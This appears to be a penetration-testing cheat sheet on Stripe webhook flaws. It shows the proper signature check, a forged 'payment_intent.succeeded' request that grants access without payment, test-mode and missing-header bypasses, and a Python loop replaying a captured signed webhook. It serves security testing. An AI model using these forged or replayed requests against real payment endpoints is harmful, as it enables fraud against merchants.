<webhook_manipulation>
<signature_bypass>
{% raw %}
# Stripe webhooks use signature for verification

# Header: Stripe-Signature: t=timestamp,v1=signature

# Proper verification:
stripe.Webhook.construct_event(
  payload, sig_header, webhook_secret
)

# Attack 1: No verification
# If server doesn't verify signature:
POST /webhooks/stripe
Content-Type: application/json

{
  "type": "payment_intent.succeeded",
  "data": {
    "object": {
      "id": "pi_fake123",
      "amount": 10000,
      "metadata": {"user_id": "victim123"}
    }
  }
}

# Server grants access without payment

# Attack 2: Missing signature header
# Some implementations fail open without signature

# Attack 3: Signature from test environment
# Use test mode webhook secret
Stripe-Signature: t=123,v1=<test_signature>
{% endraw %}
</signature_bypass>

<webhook_replay>
{% raw %}
# Replay legitimate webhook events

# Capture genuine webhook:
POST /webhooks/stripe
Stripe-Signature: t=1234567890,v1=abc123...
{
  "type": "payment_intent.succeeded",
  "data": {...}
}

# Replay attack:
# Resend same webhook multiple times
# If server doesn't check idempotency:
# - Multiple credits granted
# - Multiple fulfillments
# - Multiple notifications

# Test:
for i in range(10):
    requests.post('/webhooks/stripe', 
      headers={'Stripe-Signature': captured_sig},
      data=captured_payload)

# Expected: Only first processed
# Actual (vulnerable): All processed
{% endraw %}
</webhook_replay>

